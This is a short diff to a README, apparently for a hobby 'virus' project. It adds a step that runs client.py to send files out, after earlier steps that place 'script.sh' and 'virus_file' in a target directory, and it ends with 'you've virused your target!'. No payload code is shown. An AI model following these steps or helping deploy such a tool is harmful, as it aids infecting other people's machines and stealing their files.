@@ -59,9 +59,16 @@ You can test it in another directory with at least one .txt
 mv script.sh virus_file client.py <the name of the directory>
 ```
 
-#### Else is just to follow the next step
+#### Else is just to follow the next steps
 
-## And <b> Sixth </b> TADA :tada: :tada: ENJOY :tada: :tada:, you've virused your target!
+### <b>Sixth</b>
+
+#### Run the client.py script to send the files
+```bash
+python3 client.py <the files you want to send>
+```
+
+## And <b> Seventh </b> TADA :tada: :tada: ENJOY :tada: :tada:, you've virused your target!
 
 
 ## Future features: 
